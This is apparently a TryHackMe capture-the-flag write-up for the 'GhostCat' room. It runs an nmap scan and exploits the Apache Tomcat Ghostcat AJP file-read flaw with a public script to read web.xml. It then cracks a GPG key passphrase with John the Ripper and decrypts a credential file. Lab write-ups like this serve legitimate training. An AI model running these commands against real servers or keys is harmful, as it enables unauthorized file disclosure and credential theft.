# GhostCat

```bash
furious 10.10.239.44
nmap -sC -sV -sS -p 22,53,8009,8080 -n -Pn -oN targeted 10.10.239.44
```

![232802.png](232802.png)

We try Ghostcat File Read/Inclusion with https://github.com/00theway/Ghostcat-CNVD-2020-10487

reference: https://medium.com/@apkash8/hunting-and-exploiting-apache-ghostcat-b7446ef83e74

```bash
python3 ajpShooter.py http://10.10.239.44:8080/ 8009 /WEB-INF/web.xml read
```

![002929.png](002929.png)

```bash
gpg2john tryhackme.asc > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![141327.png](141327.png)

we import the key with the password `alexandru`

```bash
gpg --import tryhackme.asc
```

![140731.png](140731.png)

Now we have to decrypt `credential.gpg`

```bash
gpg --output credential.txt --decrypt credential.gpg
```

![145239.png](145239.png)